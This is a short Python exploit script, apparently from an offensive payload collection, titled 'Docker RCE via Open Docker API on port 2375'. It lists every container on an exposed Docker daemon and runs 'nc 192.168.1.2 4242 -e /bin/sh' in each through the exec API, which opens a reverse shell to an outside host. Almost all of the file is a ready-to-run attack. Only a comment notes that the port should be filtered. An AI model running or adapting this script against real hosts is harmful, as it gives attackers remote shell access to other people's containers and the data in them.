from __future__ import print_function
import requests
import logging
import json
import urllib.parse

# NOTE
# Enable Remote API with the following command
# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
# This is an intended feature, remember to filter the port 2375..

name          = "docker"
description   = "Docker RCE via Open Docker API on port 2375"
author        = "Swissky"

# Step 1 - Extract id and name from each container
ip   = "127.0.0.1"
port = "2375"
data = "containers/json"
url  = "http://{}:{}/{}".format(ip, port, data)
r = requests.get(url)

if r.json:
    for container in r.json():
        container_id   = container['Id']
        container_name = container['Names'][0].replace('/','')
        print((container_id, container_name))

        # Step 2 - Prepare command
        cmd = '["nc", "192.168.1.2", "4242", "-e", "/bin/sh"]'
        data = "containers/{}/exec".format(container_name)
        url = "http://{}:{}/{}".format(ip, port, data)
        post_json = '{ "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":'+cmd+' }'
        post_header = {
            "Content-Type": "application/json"
        }
        r = requests.post(url, json=json.loads(post_json))


        # Step 3 - Execute command
        id_cmd = r.json()['Id']
        data = "exec/{}/start".format(id_cmd)
        url = "http://{}:{}/{}".format(ip, port, data)
        post_json = '{ "Detach":false,"Tty":false}'
        post_header = {
            "Content-Type": "application/json"
        }
        r = requests.post(url, json=json.loads(post_json))
        print(r)